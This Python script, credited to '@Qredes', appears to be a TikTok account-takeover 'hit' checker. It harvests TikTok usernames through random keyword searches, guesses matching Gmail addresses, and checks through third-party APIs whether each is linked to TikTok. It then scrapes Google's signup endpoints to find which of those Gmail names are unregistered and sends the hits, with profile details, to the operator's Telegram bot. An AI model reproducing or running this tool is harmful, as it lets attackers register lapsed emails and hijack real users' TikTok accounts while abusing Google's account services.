import os
try:
  from rich.console import Console
  from rich.live import Live
except:
  os.system("pip install rich")
  from rich.console import Console
  from rich.live import Live
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from uuid import uuid4
except:
  os.system("pip install uuid")
  from uuid import uuid4
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits=0
bads_tiktok=0
bads_email=0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
ID = input(f"{YELLOW}{BOLD}ID :  ")
token = input(f"{RED}{BOLD}Token : ")
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')
def info(email):
  global hits
  email=str(email)
  user = email.split('@')[0]
  try:
    headers = {
      'Host': 'www.woodrowpoe.top',
      'Connection': 'keep-alive',
      # 'Content-Length': '13',
      'package': 'woodrowpoe.tik.realfans',
      'apptype': 'android',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.124 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'idfa': '6160fb46-9862-4d44-95b9-b1911283231f',
      'Accept': 'application/json, text/plain, */*',
      'version': '1.1',
      'Origin': 'http://www.woodrowpoe.top',
      'X-Requested-With': 'woodrowpoe.tik.realfans',
      'Referer': 'http://www.woodrowpoe.top/h5_v5/',
      # 'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
      # 'Cookie': 's61336ece=pobodmoenf5fja9p6h01oinph8',
    }

    data = {
      'username': user,
    }

    response = requests.post('http://www.woodrowpoe.top/api/v1/tikTokGetUserProfileInfo', headers=headers, data=data).json()
    id = response['data']['pk']
    user = user
    name = response['data']['nickname']
    folon = response['data']['followingCount']
    folos = response['data']['followerCount']
    lik =  response['data']['heartCount']
    vid = response['data']['videoCount']
    priv = response['data']['isPraise']
    ff = (f'''
  𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
  ═══════════════════
  𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @P_W_7 | @Qredes
  ═══════════════════
  𝙽𝙰𝙼𝙴 : {name}
  𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
  𝙶𝙼𝙰𝙸𝙻 : {email}
  𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {folos}
  𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {folon}
  𝙻𝙸𝙺𝙴 : {lik}
  𝙸𝙳 : {id}
  𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {priv}
  𝚅𝙴𝙳𝙾 : {vid}
  ═══════════════════
   ''')
    requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+ID+'&text='+ff)
  except:
    ff=f'''
    𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
    ═══════════════════
    𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @P_W_7 | @Qredes
    ═══════════════════
    𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
    𝙶𝙼𝙰𝙸𝙻 : {email}
    ═══════════════════
    '''
    requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+ID+'&text='+ff)
  hits+=1
def Qredes(email):
  global bads_email
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(email)
    else:bads_email+=1
  except:''
    #Qredes(email)
def check(email):
  global bads_tiktok,hits,bads_email
  try:
    os.system('clear' if os.name == 'posix' else 'cls')
    tt=(f"\r{GREEN}Hits:{GREEN} {hits} {RED}Bad tiktok:{RED} {bads_tiktok} {YELLOW}Email Not Available:{YELLOW} {bads_email}")
    print(tt)
    api=choice(['https://aptik-1db9c6c31665.herokuapp.com/zaid/?email=','https://ktok-71c59a8d8835.herokuapp.com/zaid/?email='])
    h_h=requests.get(api+email).json()['Result']
    if h_h == True:
      Qredes(email)
    else:
      bads_tiktok+=1
  except:bads_tiktok+=1
   # check(email)
  os.system('clear' if os.name == 'posix' else 'cls')
  tt=(f"\r{GREEN}Hits:{GREEN} {hits} {RED}Bad tiktok:{RED} {bads_tiktok} {YELLOW}Email Not Available:{YELLOW} {bads_email}")
  print(tt)



from random import choice,randrange
from requests import get
from threading import Thread
def tiktok_search():
  while True:
    try:
      g=choice(['دجحخهعغفقثصضشسيبلاتنمكطظزوةىلارؤءئ','azertyuiopmlkjhgfdsqwxcvbn1234567890','アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン','あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん'])
      keyword=''.join((choice(g) for i in range(randrange(3,15))))
      api=choice(['https://search-tiktok-1-171abbbf8702.herokuapp.com/','https://search-tiktok-2-c9711a07f632.herokuapp.com/'])
      api=get(api+'Qredes/keyword='+keyword).json()['user_list']
      for user in api:
        username=user['user_info']['unique_id']
        secUid=user['user_info']['sec_uid']
        if '_' not in username:
          check(username+'@gmail.com')
        params = {
            "count": "200",
            "minCursor": "0",
            "scene": "67",
            "secUid": secUid}
        try:
          req=get('https://www.tiktok.com/api/user/list/?',params=params).json()['userList']
        except:'Qredes'
        try:
          for i in req:
            username=i['user']['uniqueId']
            if '_' not in username:
              check(username+'@gmail.com')
        except:'Qredes'
    except:'Qredes'
for i in range(4):
  Thread(target=tiktok_search).start()

# by @Qredes